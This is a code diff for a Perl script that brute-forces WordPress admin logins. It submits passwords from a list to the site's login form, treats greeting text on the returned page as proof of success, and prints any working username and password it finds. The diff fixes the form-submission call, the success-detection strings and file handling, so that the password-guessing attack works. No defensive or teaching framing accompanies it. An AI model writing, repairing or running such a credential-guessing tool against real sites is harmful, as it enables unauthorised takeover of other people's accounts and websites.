@@ -1,5 +1,4 @@
-#On Windows #!C:/Perlroute
-#On Linux System #!/usr/bin/perl -w
+#!/usr/bin/perl -w
 
 use strict;
 use utf8;
@@ -22,7 +21,7 @@ sub verific_arguments
      foreach(@ARGV)
      {
         $answer += 1;
-        print "Arguments -> ". $_ . "\n\n";
+        print "Arguments -> $_ \n\n";
      }
      return ($answer >= 3 ? 1:0);
     }
@@ -54,7 +53,7 @@ else
         {
             chomp($_);
             #Load Form
-            $utility->submit
+            $utility->submit_form
                             (
                                 #Looking <form id="loginform">
                                 form_id => "loginform",
@@ -65,7 +64,7 @@ else
             print "$adm:$_\n";
             #Cheking answer of wordpress site
             my $content = $utility->content;
-            if ($content =~ /Bienvenido/ || $content =~ /Welcome/)
+            if ($content =~ /Hola/ || $content =~ /Hello/)
             {
                print "\n\n!!!Data acces found -> user: $adm password: $_";
                if ($report)
@@ -78,6 +77,8 @@ else
                exit;
             }
         }
+	close(filepass);
     }
-    print "\n\tPassword and username don't found :(";
+    close(fileadmin);
+    print "\n\tPassword and username don't found :(\n\n";
 }
